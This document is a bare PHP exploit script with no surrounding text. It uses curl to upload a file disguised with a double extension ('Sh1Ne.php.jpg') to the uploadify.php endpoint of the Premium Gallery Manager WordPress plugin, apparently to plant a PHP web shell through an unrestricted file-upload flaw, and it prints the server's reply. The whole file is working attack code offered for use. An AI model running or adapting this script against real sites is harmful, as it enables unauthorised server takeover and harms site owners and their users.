<?php
$uploadfile="Sh1Ne.php.jpg";
$ch =
curl_init("http://www.example.com/wp-content/plugins/Premium_Gallery_Manager/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile", 
'folder'=>'/wp-content/plugins/Premium_Gallery_Manager/uploadify/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult"; 
?>
